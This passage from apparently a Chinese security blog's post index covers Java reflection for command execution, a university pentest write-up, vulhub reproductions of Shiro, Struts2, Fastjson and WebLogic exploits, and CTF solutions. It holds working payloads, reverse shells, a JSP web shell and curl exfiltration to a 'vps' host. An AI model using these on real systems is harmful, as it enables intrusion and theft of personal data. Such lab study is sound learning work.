String.class).invoke(Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(Class.forName(\"java.lang.Runtime\")),\"calc\");\n\n\n这个的话我们其实可以把他进行拆分，这句话拆分为五段，如下所示\nClass clazz = Class.forname(\"java.lang.Runtime\");\nMethod execMethod = clazz.getMethod(\"exec\", String.class);\nMethod getRuntime = clazz.getMethod(\"getRuntime\")；\nObject currentRuntime = getRuntime.invoke(clazz);\nexecMethod.invoke(currentRuntime, \"calc.exe\");\n\n对其进行简单讲解\n1、首先通过反射获取到Runtime类\n2、通过反射获取到Runtime类的exec方法\n3、通过反射获取到Runtime类的getRuntime方法\n4、创建Runtime对象并调用exec方法\n5、调用exec方法并执行命令exec \"calc.exe\"\n\n一些其他引用反射的方式\n我们刚才说到可以通过forname拿到了一个类，并且继续利用反射或实例化调用其中的方法，如果一个类没有无参构造方法或者也没有类似单例模式里的静态方法，那我们应该怎样通过反射实例化该类呢？\n如果一个方法或构造方法是私有方法，我们应该怎么去执行它呢？\n\nProcessBuilder第一个问题，我们可以用一个新的反射方法getConstructor。\ngetConstructor(Class...)：获取某个public的Constructor；\ngetDeclaredConstructor(Class...)：获取某个Constructor；\ngetConstructors()：获取所有public的Constructor；\ngetDeclaredConstructors()：获取所有Constructor。\n\n和getMethod类似，getConstructor接收的参数是构造函数的的列表类型，因为构造函数也支持重载，所以要用参数列表类型才能唯一确定一个构造函数\n比如我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后 调用start()来执行命令\n接下来简单介绍一下ProcessBuilder。\nProcessBuilder用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法，我们可以通过实例化这个类并且通过反射调用其中的start方法来开启一个子进程 。当getRuntime被禁用时，可以用ProcessBuilder来执行命令。它有两种构造函数\npublic ProcessBuilder(List&lt;String> command)\npublic ProcessBuilder(String... commang)\n\n接下来看这个执行命令的Payload\nClass clazz = Class.forName(\"java.lang.ProcessBuilder\");\n ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start();\n\n执行过程如下\n1、首先利用反射获取ProcessBuilder类；\n2、获取clazz(ProcessBuilder)形参列表为List&lt;String> command的构造函数；\n3、将获取到的构造函数利用newInstance进行实例化，调用构造函数；\n4、对构造函数传入的参数为 calc.exe，并且用Arrays.asList方法将要执行的命令转为List类型；\n5、返回List类型的command；\n\n\n如何执行私有方法使用getDeclared系列方法，函数介绍如下\ngetConstructor(Class...)：获取某个public的Constructor；\ngetDeclaredConstructor(Class...)：获取某个Constructor；\ngetConstructors()：获取所有public的Constructor；\ngetDeclaredConstructors()：获取所有Constructor。\n\n\ngetMethod系列方法获取的是当前类中所有公共方法，包括从父类继承的方法；\ngetDeclaredMethod系列方法获取的是当前类中“声明”的方法，是实写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了。\n\n举个例子，我们之前提到过Runtime的构造方法是私有的，所以我们要通过Runtime.getRuntime()来获取对象，其实我们也可以直接用getDeclaredConstructor来获取这个私有的构造方法实例化对象，进而执行命令：\nClass clazz = Class.forName(\"java.lang.Runtime\");\n        Constructor m =clazz.getDeclaredConstructor();\n        m.setAccessible(true);\n        clazz.getMethod(\"exec\",String.class).invoke(m.newInstance(), \"calc.exe\");\n\n这里我们在获取到私有方法后，要用setAccessible()方法使这个私有方法可以被访问，其他的就和之前介绍的反射一样了，如果不用setAccessible()方法修改作用域这个方法是仍然不能调用的\n\n参考https://xz.aliyun.com/t/12155#toc-7\nhttps://javasec.org/javase/Reflection/Reflection.html\nhttps://github.com/Y4tacker/JavaSec/blob/main/1.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%8F%8D%E5%B0%84/%E5%8F%8D%E5%B0%84.md\n《JAVA安全漫谈》\n","slug":"JAVA反射机制","date":"2023-05-08T16:51:30.000Z","categories_index":"JAVA","tags_index":"JAVA安全","author_index":"quan9i"},{"id":"594145ca1c62f813346e24debc2a5552","title":"一洞百分-记一次意外通杀之旅","content":"声明文章首发于奇安信社区https://forum.butian.net/share/2264\n前言小白初入渗透，想获得一个教育SRC的漏洞证书，觉得某州学院是比较好看的，而且只需要10rank，不是很多，对我这个小白很友好，因此就开始了本次的渗透之路（意外的收获了小通杀）。\n目标搜集首先是对此学校的站点进行了地毯式搜索，当时的思路是这样的：大多数人在挖证书站的时候，都是找的edu.cn这种域名的，那这样的话edu域名的肯定被其他师傅找过很多次了，存在漏洞的概率要小一些。所以我反其道而行之，搜索站点时，摒弃以edu.cn结尾的站点，这样找到的站点相对来说比较冷门些（小白的个人见解）\n当时使用的是鹰图，为了尽可能多的搜集相关站点，使用body参数进行搜集，具体语法如下\nbody=\"xx学院\"&amp;&amp;domain!=\"edu.cn\"\n\n而后经过不懈努力，我这个会点鼠标的猴子在浏览数百个站点后，找到了我们的这个可疑站点。\n第一次测试弱口令拿到这个站点后，当时它的界面如下所示\n\n对于这种站点，我的想法是首先尝试下弱口令，因此尝试了admin/admin,admin/123456,admin/admin888这些，而后发现admin/123456可成功登录站点，\n幸运的拿到了一个证书站的管理员权限\n\n它的学生管理处存储了大量学生信息\n\n获取到了大量学生数据。第一个漏洞此时就出现了，存在危害的弱口令漏洞。\n垂直越权当时看到这个学生管理界面的时候，就想到一种情况：即登录学生账号时，访问该接口，能否成功访问到此接口并获取学生数据呢，接下来进行测试。\n在使用管理员登录成功后，打开Burpsuite，点击学生管理时进行抓包，从而获取它的接口\n\n成功找到接口，与该站点进行拼接，得到https://xxx.com/admin/bas/bas_student_list.html?_t=234316&amp;_winid=w1176\n接下来登录学生账号，从学生管理中借用一个学号，此时便有账号了，但密码是什么呢？转念一想，既然管理员账号密码都是弱口令了，那学生账号会不会也是弱口令呢，随手输入一个123456进行尝试，结果如我们所料想的一般，的确是弱口令。\n接下来访问刚刚获取到的的接口\n\n成功获取到学生具体信息，但有些乱码，不过不影响整体。\n同类站点寻找在发现这个漏洞后，我发现它的登录界面提示了xxx科技，然后就萌生了一个想法，这会不会有多个学校使用此系统呢，然后我就开始了同类站点的寻找之路。\nIcon图标一般寻找同类站点的话，首先想到最快捷的方法就是通过它的icon图标进行检索，所以我们进行打开F12，然后刷新网站，打开网络\n\n此时就会发现favicon.ico图标，我常用的搜索方式有两种，一种是用hunter，一种是用fofa，但fofa搜icon图标貌似结果总是不尽人意，所以这里用hunter来进行搜索，打开鹰图后，点击图标检索\n\n接下来进行搜索即可\n\n此时可发现180多个高校在使用此系统，此时就可以通刷了。\n关键词搜索但我第一次并不是用上面的方法来寻找同类站点的，不然也不至于edu也只有那么点分了，当时我只注意到了内容中含有xxx科技，因此我在hunter中以如下语法进行了搜索\nweb.body=\"xxx科技\"&amp;&amp;title=\"学院\"&amp;&amp;icp.name!=\"公司\"\n\n\n当时用这种方法进行了搜索，显而易见，资产少了很多，因此当时只刷了一点点分数。\n第二次测试因为第一次测试时，由于提交时间问题，导致只有寥寥数个站点成功通过了审核获取了一些rank，因此心有不甘，然后开始了自己的第二次测试之旅\nSpring boot敏感信息泄露用Dirsearch进行目录扫描后并没有发现什么路径，因此自己尝试进行拼接路径，加上**/admin、/login**这些，而后发现\n\n一眼顶真，这是Spring boot的经典报错界面，关于Spring boot的一些漏洞，关于它，可以参考这篇文章https://www.freebuf.com/articles/web/271347.html\n后来经测试发现访问http://xxx/actuator可以访问到界面\n\n发现有多处敏感信息泄露，而这个漏洞是由于配置不当引起的Actuator路由泄露，它这里比较危险的就是我们发现这里有heapdump泄露，heapdump是一个二进制文件，它存储了JVM内存信息，可以根据它来分析出明文密码。\n访问https://xxx/actuator/heapdump即可下载该文件\n对于该文件的分析，常见的有以下几个工具\n1、jvisualvm（电脑自带）\n2、Eclipse Memory Analyzer(MAT)\n3、heapdump_tool\n\n\n它可以打开heapdump文件，然后我们用如下语句进行密码搜索\nSpring boot 1.x版本：select s.value.toString() from java.util.Hashtable$Entry s where /password/.test(s.key.toString())\nSpring boot 2.x版本：select s.value.toString() from java.util.LinkedHashMap$Entry s where /password/.test(s.key.toString())\n\n但这个有些不方便，同时有时候会搜索不出密码，因此我们不选择这个。MAT与它类似，只是搜索语句变了，具体如下\nSpring boot 1.x版本：select  from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(“password”))\nSpring boot 2.x版本：select  from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(“password”))\n\n我们这里采用的方式的话，是用自动化工具heapdump_tool来进行自动提取，工具链接如下\nhttps://github.com/wyzxxz/heapdump_tool\n它本质上是基于jhat，通过jhat解析heapdump文件，从而实现密码等关键词的获取\n\n此时可以在输入heapdump后，只需要输入关键词password，就可以查询出相关密码，这里可以看到一些密码\njasypt.encryptor: pig\nrabbitmq: guest\nredis:xxxxx._168\n\njasypt.encryptor这个是加密算法，pig应该是密钥，不过这里的话因为代码能力烂的一批，未进行深入。\nrabbitmq和redis在测试后，发现连接不起来，可能是由于并未开启远程服务，因此对于Spirng boot 就止步于此了，同理在同系统的其他站点后测试发现存在heapdump泄露，又是一次小通杀。\n\n水平越权在发现其他站点后发现存在一个证书站，因此单独对这个站进行了测试，依旧是信息搜集收集学号。\n而后尝试弱口令密码123456，发现成功登录\n\n此时提示修改密码，可以使用F12，将这个修改密码的窗口给删去，从而实现访问其他功能点（非必要情况下不建议修改密码），而后我们可以打开Burpsuite，点击一些比较敏感的功能点，比如，个人信息处、查看成绩处、查看课表处这些接口，看是否存在一些参数，如果存在的话，是可能存在越权的。\n而后在查询成绩的这个接口，即admin/stuTermScore/uidSelect?uid=122&amp;_=1669192062363这里发现了参数uid\n\n可以发现它是能够查询出姓名和学号的，因此我们尝试更改uid参数，看是否可以查看其他人的相关信息\n\n此时发现修改uid参数的值后，成功查询处另一个人的相关信息，因此说明存在水平越权漏洞。这个是相对来说危害较大的，还有两个其他的，即查询课表处和查询成绩处。\n查询课表处，这个接口是admin/stuTeacherCurriculum/stuTeacherCurriculum?stuTermScoreid=&amp;stuid=3829，此时可以发现存在参数stuid，更改此参数后可以查询不同学生的任课教师和对应课程信息\n\n\n查询成绩处，这个接口是admin/measure/countGraduationScore?userId=10&amp;_=1669192463940，发现参数userid，更改参数值即可查看其他人成绩\n\n\n因此这个站点的话，是找到了三个水平越权点，提交后也是成功水到了一个中危漏洞。\n第三次测试因为技术有限，在挖新站点的漏洞时总是没思路没进展，所以兜兜转转还是回到了这个系统，并开始了第三次测试之路，这次也是异常的顺利，看了不久就找到了一个漏洞\n日志泄露接管管理员权限在登录\n\n此时发现有个查看更多的功能点，点击后可查看自身的登录日志及其他日志，F12再点击此功能\n\n可以发现接口是**/admin/sys/syslog.html?_winid=w9479&amp;_t=126812**,这里直接进行访问\n\n此时可以发现这个疑似是直接访问到了全部用户的日志，选择时间较早一些，可看见数万条日志，而后我们这里发现有很多可填的地方，我们尝试在创建者处添上admin，在日志类型处选择登录日志\n\n此时成功发现了admin的登录日志，且他们提交的数据中含有password参数，选中数据处右键查看源代码即可看到密码\n\n这里由于密码与公司名相关，所以也加码了，还望师傅们理解。\n假设公司名为大家好，这里的密码就是DaJiaHao._1405\n不过这也为师傅们提供了一个密码爆破的思路，即通过公司名来猜测密码。\n同时这里发现多个不同学校使用同一密码进行登录，因此猜测这是一个多站点通用的密码，而后在其他站点进行尝试，成功登录，验证了自己的猜想。\n\n点击学生管理处可以看到学生数据\n\n选中某条记录，点击学生详细\n\n此时可以发现包括sfz号以及住址都可查看，敏感信息泄露较多，且学生数据有数万条，危害程度显而易见。\n其他站点亦是如此，因此通过这次又成功接管了多所高校的管理员权限，这次成功混了一些rank，兑换自己的证书绰绰有余，本次测试就心满意足的结束了。\n后言这个是本小白的第一次小通杀，前前后后虽然经历了几个月的时间，由于前期同类站点寻找不到位，导致很多站点没交上去，也是错失了很多分数，在这里也提醒各位师傅，找到漏洞后首先要多找找同类站点再交。但整体来说的话，这个系统前前后后也刷了百余rank，对我这个小白来说也算是非常不错了。最后还要声明一下：以上漏洞均已报告给相关学校且已修复。\n","slug":"记一次渗透测试","date":"2023-04-30T18:27:30.000Z","categories_index":"渗透","tags_index":"漏洞挖掘","author_index":"quan9i"},{"id":"d33a4e6758c9cb9a2d0afd329ce9632a","title":"JAVA常见漏洞复现","content":"ShiroShiro 550漏洞原理Shiro550漏洞原理是Shiro框架提供了一种记住密码(Rememberme)的功能，用户登录成功后会生成经过加密的Cookie值，对Remembe的Cookie进行AES解密、Base64解密后再反序列化，就导致了反序列化RCE漏洞 。 Shiro&lt;1.2.4版本，其使用的密钥为固定密钥Shiro550kPH+bIxk5D2deZiIxcaaaA==，这就更容易导致RCE漏洞\n漏洞复现用vulhub复现\ncd vulhub/shiro/CVE-2016-4437\n\n而后开启服务\ndocker-compose up -d \n//-d是后台运行，加不加皆可\n\n\n访问\n\n脚本攻击端开启监听\n\n而后构造反弹shell语句，在线生成编码后的反弹shell网站\nhttps://ares-x.com/tools/runtime-exec\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n//bash -c &#123;echo,bash -i >&amp; /dev/tcp/192.168.1.129/6666 0>&amp;1&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\n而后通过ysoserial工具的JRMP监听6666端口并执行反弹shell指令\n这里我们相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定 CommonsCollections5 利用链生成可执行bash -i &gt;&amp; /dev/tcp/192.168.200.131/6666 0&gt;&amp;1命令的序列化数据payload1。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload1。\njava -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections5 \"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\"\n\n\n接下来去利用密钥伪造rememberMe字段，脚本如下\nimport sys\nimport uuid\nimport base64\nimport subprocess\nfrom Crypto.Cipher import AES\ndef encode_rememberme(command):\n    popen = subprocess.Popen(['java', '-jar', 'ysoserial-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)\n    BS = AES.block_size\n    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()\n    key = base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\")\n    iv = uuid.uuid4().bytes\n    encryptor = AES.new(key, AES.MODE_CBC, iv)\n    file_body = pad(popen.stdout.read())\n    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))\n    return base64_ciphertext\n \nif __name__ == '__main__':\n    payload = encode_rememberme(sys.argv[1])   \nprint \"rememberMe=&#123;0&#125;\".format(payload.decode())\n\n而后运行python2 shiro.py 192.168.1.129 7777\n\n接下来对网站进行抓包，在Cookie中添加我们伪造的rememberMe参数\n\n此时查看，已成功反弹shell。\n自动化工具\nShiro 721漏洞原理  在用户进行登录的时候，Apache Shiro提供Rememberme功能，可以存储cookie，期间使用的是AES-128-CBC进行加密，可以通过Padding Oracle加密生成的攻击代码来重新构造一个恶意的rememberMe字段，重新请求网站，进行反序列化攻击，最终导致任意代码的执行。\nShiro721是使用 登录后rememberMe= {value}去爆破正确的key值 进而反序列化，shiro721 本质上是 padding attack，爆破要弄很久。对比Shiro550条件只要有 足够密钥库 （条件较低）、Shiro721需要登录（要求较高 ）。\nStruts2漏洞原理Struts2 漏洞的原理是由于 Struts2 框架中的一个组件，即 OGNL(Object-Graph Navigation Language) 表达式解析器，存在漏洞。OGNL 是一种强大的表达式语言，它允许开发人员在 Struts2 应用程序中使用动态表达式来访问和操作对象。但是，由于 OGNL 表达式解析器的实现不够安全，攻击者可以通过构造恶意 OGNL 表达式来执行任意代码。例如：当用户提交表单数据并验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。\n漏洞检测.do或者 .action 的网站后缀\n\n漏洞复现s2-001使用Vuldb靶场进行复现\ncd vulhub/struts2/s2-001\n\n而后开启容器\ndocker-compose up -d\n\n\n输入**%{1+2}**，结果变成3\n\n说明解析了，存在漏洞，查询tomact路径\n%&#123;\"tomcatBinDir&#123;\"+@java.lang.System@getProperty(\"user.dir\")+\"&#125;\"&#125;\n\n\n回显**tomcatBinDir{/usr/local/tomcat}**，成功实现命令执行\ns2-053cd vulhub/struts2/s2-053\ndocker-compose up -d\n\n\n访问环境hello.action\n\n接下来查看监听\n\nS2-061开启环境用vulhub\ncd vulhub/struts2/s2-061\ndocker-compose up -d\n\n接下来抓包，而后修改为POST请求，发送反弹shell恶意指令\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Disposition: form-data; name=\"id\"\n\n%&#123;(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))&#125;\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF--\n\n\n\n\nFastjson漏洞原理目标网站在解析 json 时，未对 json 内容进行验证，直接将 json 解析成 java 对象并执行，这就给了攻击者可乘之机，构造对应的 payload ，让系统执行，然后达到代码执行，甚至命令执行的目的。\n攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。\n知识科普\nJNDI是 Java 命名与目录接口（Java Naming and Directory  Interface），在J2EE规范中是重要的规范之一。JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI再局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。\nRMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。\nRMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java  远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。RMI服务端可以直接绑定远程调用的对象以外，还可通过References类来绑定一个外部的远程对象，当RMI绑定了References之后，首先会利用Referenceable.getReference()获取绑定对象的引用，并在目录中保存，当客户端使用lookup获取对应名字时，会返回ReferenceWrapper类的代理文件，然后会调用getReference()获取Reference类，最终通过factory类将Reference转换为具体的对象实例。\n漏洞复现cd vulhub/fastjson/1.2.24-rce\ndocker-compose up  -d\n\n访问环境\n\n在攻击机模拟json发送post请求\ncurl http://192.168.1.129:8090/ -H \"Content-Type: application/json\" --data '&#123;\"name\":\"karsa\", \"age\":22&#125;'\n\n\n验证漏洞存在，接下来去打\n首先编辑恶意java代码\n// javac TouchFile.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class TouchFile &#123;\n    static &#123;\n        try &#123;\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = &#123;\"touch\", \"/tmp/success\"&#125;;\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n        &#125; catch (Exception e) &#123;\n            // do nothing\n        &#125;\n    &#125;\n&#125;\n\n对文件进行编译\njavac TouchFile.java\n\n搭建HTTP服务传输文件\npython -m SimpleHTTPServer 1387\n\n\n\n接下来利用java反序列化工具\ngit clone https://github.com/mbechler/marshalsec.git 下载marshalsec\napt-get install maven 安装maven\nmvn clean package -DskipTests 使用maven编译marshalsec成jar包\n\n启动RMI服务器，监听9999端口\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://192.168.1.129:1387/#TouchFile\" 9999\n\n\n而后抓包，修改为POST请求，修改Content-Type为 application/json，而后传输如下数据\n&#123;\n    \"b\":&#123;\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\":\"rmi://192.168.1.129:9999/TouchFile\",\n        \"autoCommit\":true\n    &#125;\n&#125;\n\n\n而后查看容器中的/tmp下已成功生成success，反弹shell同理，只需要更改代码即可\n// javac TouchFile.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class TouchFile &#123;\n    static &#123;\n        try &#123;\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = &#123;\"/bin/bash\", \"-c\", \"bash -i >&amp; /dev/tcp/192.168.1.129/6666 0>&amp;1\"&#125;;\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n        &#125; catch (Exception e) &#123;\n            // do nothing\n        &#125;\n    &#125;\n&#125;\n\n\n\nLog4j2漏洞原理log4j2框架下的lookup查询服务提供了**{}字段解析功能，传进去的值会被直接解析。例如${java:version}**会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。\n攻击者可以利用这一点进行JNDI注入，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的**.class对象**，造成了远程代码执行（可反弹shell到指定服务器）。\nWeblogicT3反序列化漏洞Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以\n通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击。\n漏洞复现准备反弹shell指令如下\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n//Base64编码的内容为bash -i >&amp; /dev/tcp/192.168.1.129/6666 0>&amp;1\n\n接下来开启监听\n\n接下来利用反序列化工具ysoserial.jar\njava -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'\n\n\n接下来下载Exp进行攻击，\nExp地址：https://www.exploit-db.com/exploits/44553\n复制代码到Exploit.py中，接下来执行如下指令\npython2 Exploit.py 192.168.1.129 7001 /tools/weblogic/ysoserial-all.jar 192.168.1.129 9999 JRMPClient\n\n\n此时查看监听处\n\n成功反弹shell\nXML漏洞漏洞复现Vulhub复现\ncd vulhub/weblogic/CVE-2017-10271\ndocker-compose up  -d\n\n开启环境后访问http://192.168.1.129:7001/_async/AsyncResponseService\n\n访问成功说明存在漏洞\n写入shell.txt文件，内容如下\n&lt;%\n    if(\"123\".equals(request.getParameter(\"pwd\")))&#123;\n        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();\n        int a = -1;\n        byte[] b = new byte[1024];\n        out.print(\"&lt;pre>\");\n        while((a=in.read(b))!=-1)&#123;\n            out.println(new String(b));\n        &#125;\n        out.print(\"&lt;/pre>\");\n    &#125;\n%>\n\n接下来开启http服务，使得它可以被访问\npython -m SimpleHTTPServer 1387\n\n\n在浏览器访问\n\n接下来就可以直接打了，更改Content-Type为:text/xml，而后传输POST数据如下\n&lt;soapenv:Envelope \nxmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n&lt;soapenv:Header>\n&lt;wsa:Action>xx&lt;/wsa:Action>\n&lt;wsa:RelatesTo>xx&lt;/wsa:RelatesTo>\n&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n&lt;void class=\"java.lang.ProcessBuilder\">\n&lt;array class=\"java.lang.String\" length=\"3\">\n&lt;void index=\"0\">\n&lt;string>/bin/bash&lt;/string>\n&lt;/void>\n&lt;void index=\"1\">\n&lt;string>-c&lt;/string>\n&lt;/void>\n&lt;void index=\"2\">\n&lt;string>wget http://192.168.1.129:1387/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp&lt;/string>\n&lt;/void>\n&lt;/array>\n&lt;void method=\"start\"/>&lt;/void>\n&lt;/work:WorkContext>\n&lt;/soapenv:Header>\n&lt;soapenv:Body>\n&lt;asy:onAsyncDelivery/>\n&lt;/soapenv:Body>&lt;/soapenv:Envelope>\n\n\n状态202则说明成功写入，接下来去访问这个木马文件并尝试执行命令\n\n\n成功实现命令执行\niiop反序列化漏洞漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了,T3协议使用的是resolveClass方法去过滤的,resolveClass方法是会读取父类的,所以T3协议这样过滤是没问题的。但是IIOP协议这块,虽然也是使用的这个黑名单列表,但不是使用resolveClass方法去判断的,这样默认只会判断本类的类名,而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了,而JtaTransactionManager类是存在jndi注入的。\nSSRF漏洞weblogic中存在SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件\n其他中间出了一点小Bug，就是我没安装javac，只有java，但安装了过后发现无法运行jar包了\n\n百度过后发现是jdk版本的问题，我们可以使用下面指令来切换JDK版本\nupdate-alternatives --config java \n\n\n更改为低版本后成功运行jar包\n\n","slug":"常见JAVA漏洞复现","date":"2023-04-20T07:02:30.000Z","categories_index":"JAVA","tags_index":"漏洞复现","author_index":"quan9i"},{"id":"7dcc2ac2a5074f9dfc556173516085db","title":"部分CTF赛题复现","content":"春秋杯Phpstudy之前并未复现这个漏洞，只知道是一个XSS导致的RCE，在比赛时没有思路，现进行复现。\n搭建环境使用Windows，在官网https://www.xp.cn/windows-panel.html安装完小皮面板安装包后，拖入虚拟机进行安装即可\n\n安装完后我们需要修改account.php文件\n\n这里可以发现他这里分配了一个随机码，如果没有这个随机码，我们访问就是404的状态\n\n这里看一下相关代码\n\n可以发现有一个验证是判断HTTP_X_REQUESTED_WITH字段是否为XMLHttpRequest，如果是就正常访问，否则就404，因此我们加上此字段\n\n此时便可正常访问。\n接下来即可进行密码重置\npayload如下\nadmin';UPDATE ADMINS set PASSWORD = 'c26be8aaf53b15054896983b43eb6a65' where username = 'admin';--\n\n\n此时虽提示密码错误，但已成功重置\n\n发现这里有计划任务\n\n添加语句\nbash -i >&amp; /dev/tcp/VPS/port 0>&amp;1\n\n反弹shell即可\neasypywww.zip存在文件泄露，访问后获取到源码，但此时是pyc文件，因此需要进行文件反编译\n安装工具Decompyle6进行反编译，而后获取到源码，具体如下\n# uncompyle6 version 3.9.0\n# Python bytecode version base 3.8.0 (3413)\n# Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15) \n# [GCC 8.3.0]\n# Embedded file name: app.py\n# Compiled at: 2023-04-16 15:41:59\n# Size of source mod 2**32: 1030 bytes\nimport numpy, base64\nfrom flask import Flask, Response, request\napp = Flask(__name__)\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    return '小p想要找一个女朋友，你能帮他找找看么？'\n\n\n@app.route('/girlfriends', methods=['GET', 'POST'])\ndef girlfriends():\n    if request.values.get('data'):\n        data = request.values.get('data')\n        numpydata = base64.b64decode(data)\n        if b'R' in numpydata or b'bash' in numpydata or b'sh' in numpydata:\n            return '不能走捷径啊'\n        resp = numpy.loads(numpydata)\n        return '可以的，要的就是一种感觉'\n    return '有进步了,但是不多'\n\n\n@app.route('/download', methods=['GET', 'POST'])\ndef download():\n    with open('www.zip', 'rb') as (f):\n        stream = f.read()\n    response = Response(stream, content_type='application/octet-stream')\n    response.headers['Content-disposition'] = 'attachment;filename=www.zip'\n    return response\n\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n\nnumpy.loads，这个可以看出考察点是Python反序列化，这里过滤了R、bash以及sh，所以这里不能再使用R操作符进行操作，这里的话是只执行命令无回显的，所以我们需要进行外带，用curl进行外带即可，用i操作符实现外带，具体payload如下\nimport base64\n\ndata=b'''(S'curl vps:port/`cat /f*`'\nios\nsystem\n.'''\nprint(base64.b64encode(data))\n\nezrust给出了源码，具体如下\nuse actix_files::NamedFile;\nuse actix_web::&#123;App, HttpRequest, HttpResponse, HttpServer, Responder, Result, web, get, post, guard&#125;;\nuse std::path::PathBuf;\n\n\nasync fn index(req: HttpRequest) -> Result&lt;NamedFile> &#123;\n    let mut path: PathBuf = req.match_info().query(\"filename\").parse().unwrap();\n    if path.to_str().expect(\"REASON\").to_string().contains(\"p\") &#123;\n        path = PathBuf::from(\"no\");\n    &#125;\n    